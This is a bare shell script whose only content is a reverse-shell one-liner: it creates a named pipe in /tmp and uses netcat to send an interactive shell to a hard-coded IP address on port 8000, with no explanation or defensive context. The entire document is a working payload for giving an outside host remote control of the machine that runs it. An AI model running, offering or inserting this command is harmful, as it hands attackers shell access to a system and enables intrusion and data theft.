#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 104.248.120.114 8000 >/tmp/f;
